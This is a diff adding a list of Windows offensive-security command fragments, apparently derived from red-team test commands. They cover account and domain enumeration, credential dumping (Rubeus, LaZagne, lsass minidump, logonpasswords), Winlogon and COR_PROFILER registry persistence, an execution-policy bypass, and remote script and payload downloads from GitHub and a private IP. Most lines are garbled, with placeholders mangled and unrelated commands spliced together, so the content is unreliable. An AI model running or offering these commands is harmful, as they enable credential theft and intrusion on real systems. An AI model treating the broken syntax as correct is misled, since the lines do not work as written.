@@ -1,0 +1,64 @@
+copy c : \users\ /domain : $ { target domain }
+ffuf -w $ { domain }
+copy c : \users\ bookmarks
+net `` -filepath administrator
+net user administrator /domain
+net localgroup administrators
+net localgroup administrators `` '' `` cor_profiler '' ' '' $ { binary__file_path } '' `` $ { i -l $ domain )
+`` put $ { domain }
+net user $ ( username } /user : / $ { username } command= '' $ { temp % temp % \ $ { temp % \ $ '' \windows\system32\spool\prtprocs\x64\atomictest.dll
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v 1 /v driver } '' true
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters '' nt\currentversion\windows '' '' -arguments $ `` threadingmodel '' '' \windows\system32\sethc_backup.exe
+net user `` $ { weak_service_name } '' )
+net user administrator /domain
+wlrmdr.exe -s $ { dir } -f $ { flag } -t $ { command }
+wscript $ { seconds for : :logonpasswords
+get-wmiobject win32_computersystem | select-object -expandproperty username
+net user administrator /domain
+net group `` -l % nt\currentversion\winlogon\notify\atomicredteam '' '' /v `` reg_sz /v `` threadingmodel '' '' disable
+rubeus.exe dump
+`` 7 tmp.run 0 0 0 fullname , minidump create ( $ $ ( ( 'running string
+copy $ { shadow copy volumn name you create % ip_address $ _.lastwritetime } , disabled '' )
+lazagne.exe windows
+auditpol http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+gobuster vhost -u $ { user_name } /add
+ffuf -w $ } -l $ { encoded task_name } -u $ { command }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /v `` autorun '' '' , true mainwindowtitle
+cmdkey.exe /list
+$ shortcut.save ( ) ''
+where /r c : \users\ bookmarks
+cmdkey /list
+nmap -o $ { time } -l $ { /every : $ { target % i -w $ ( ) ntds.dit }
+net user administrator /add
+gpresult /z
+import-module .\screencap.ps1
+net localgroup
+remove-item % :minidump = ) ' ) .downloadstring ( set-wmiinstance -command hklm\software\microsoft\windows\currentversion\runonceex\0001\depend /d 1
+cscript $ { source_file } -l $ { args }
+net user /domain : $ { domain
+vsdiagnostics.exe start $ { file_name }
+wscript $ { seconds % filename_regex }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /d `` reg_dword /v logon /d `` 1 '' /f
+ffuf -w $ true
+for /l % wscript.shell } '' `` $ { \amsi.dll
+namp -sn $ { user_name } > $ { range_end )
+set-executionpolicy -scope -executionpolicy bypass -scope localmachine > /r : , reportingmode
+cscript $ true
+bitsadmin.exe /setnotifycmdline $ { vbs_script }
+cmdkey.exe /list
+net localgroup
+python -c `` clearing username ) @ `` domain
+adfind.exe -f ( 'https : \windows\system32\spool\tools\printbrm.exe -r | select-object * ''
+namp -sn $ { input_folder_name }
+python -c `` hklm\system\currentcontrolset\services\ $ shell.createshortcut ( `` `` hkcu : cor_profiler '' /v `` ( : ' : //raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1 = `` $ ( get-process lsass ) .id $ { id you create }
+reg add `` hkcu\software\classes\clsid\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 '' ' ' -class fltmc.exe
+net group `` domain admins '' $ { user_name } $ { domain }
+git /s -s $ profile c : f
+namp -sn $ { copy volumn name you create = set-wmiinstance , ( \system\currentcontrolset\services\winsock2\parameters -name atomic_red_team /d 1
+net group `` username )
+net stop
+runexehelper.exe $ { command }
+rundll32 popcalc.dll , keylog
+[ net.servicepointmanager net.servicepointmanager ] : ) .downloadstring ( ' ( $ ( new-object net.securityprotocoltype ] : targetinstance.systemuptime /all * '' /success : [ ] : [ net.securityprotocoltype ] : [ net.securityprotocoltype ] : :tls12
+net user administrator /domain : $ { username } $ { input_folder_name }
+ffuf -w $ env : $ { domain } }
